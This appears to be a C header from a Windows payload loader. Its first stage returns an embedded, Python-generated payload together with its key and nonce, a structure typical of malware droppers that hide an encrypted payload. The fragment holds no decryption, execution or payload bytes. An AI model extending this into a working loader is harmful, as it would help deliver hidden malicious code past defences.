#pragma once
#include "../../core/utils.h"
#include <windows.h>

// Các biến toàn cục do Python tạo ra
extern unsigned char PAYLOAD[];
extern unsigned int  PAYLOAD_LEN;
extern unsigned char PAYLOAD_KEY[];
extern unsigned int  PAYLOAD_KEY_LEN;
extern unsigned char PAYLOAD_NONCE[];
extern unsigned int  PAYLOAD_NONCE_LEN;

typedef struct {
    unsigned char* data;
    int length;

    unsigned char* key;
    int key_len;

    unsigned char* nonce;
    int nonce_len;

    unsigned char* allocated_mem;
} PayloadContext;

PayloadContext Stage1_Storage_GetData() {
    PayloadContext ctx = {0};

    ctx.data      = PAYLOAD;
    ctx.length    = PAYLOAD_LEN;
    ctx.key       = PAYLOAD_KEY;
    ctx.key_len   = PAYLOAD_KEY_LEN;
    ctx.nonce     = PAYLOAD_NONCE;
    ctx.nonce_len = PAYLOAD_NONCE_LEN;

    #ifdef DEBUG_MODE
        if (ctx.length == 0) DEBUG_MSG("Stage 1", "Payload length is 0");
        else                 DEBUG_MSG("Stage 1", "Payload loaded from embedded storage");
    #endif

    return ctx;
}